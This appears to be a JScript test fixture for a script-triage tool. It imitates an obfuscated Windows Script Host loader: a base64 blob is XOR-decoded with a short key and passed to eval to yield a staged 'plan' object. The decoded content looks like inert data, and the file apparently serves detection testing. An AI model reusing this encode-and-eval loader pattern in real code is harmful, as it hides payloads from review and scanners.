// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_cda2c3e3(SoUrCeByTeS) {
  var keyBytes = [164,35,73,98,70];
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ keyBytes[i % keyBytes.length]); }
  return DeCoDeDByTeS;
}
function recover_2e57c943() {
  var packedText = "3wE6FiPUUGtYHYZCKhMzzVEsPTTBTiYWI4YPawYv11MoFiXMfCQHK8tRMEAbiAEoBifUVywQZJ4BBDEe6W97TB7pbwE2EvQNf0x2hg9rFCfIViwRZJ5YawEnyVMoCyHKfCAGZJ4BKgMr1EIgBSiJEn5QdsIaeQFzwAFlQDPWT2tYZMxXPRI1ngxmU3GWEy9bdscWLUwj3EIkEirBDSAMMMVPIAZpwUctWn6RFSpMIsVXa05k0VAsEBnFRCwMMoYZayozylc7BzXXbygAaZUUe1IgnRMqVyKGXmVANdBCLgcFy1YnFmSeETQ=";

  var SoUrCeByTeS = decodeBase64(packedText);

  var NeUtRaL = (2 > 1) ? "left" : "right";

  var DeCoDeDByTeS = [];

  var pass = 0;

  while (pass < 1) { DeCoDeDByTeS = decode_cda2c3e3(SoUrCeByTeS); pass++; }

  var textParts;

  textParts = [];

  for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }

  var DeScRiPtOrTeXt = textParts.join("");

  return DeScRiPtOrTeXt;
}
function inspect_19ad6047() {
  var DeScRiPtOr = eval("(" + recover_2e57c943() + ")");
  var PlAn = new Object();
  PlAn["steps"] = DeScRiPtOr["steps"];
  PlAn["adapter"] = DeScRiPtOr["adapter"];
  PlAn["values"] = DeScRiPtOr["values"];
  PlAn["stageCount"] = DeScRiPtOr["stageCount"];
  return PlAn;
}
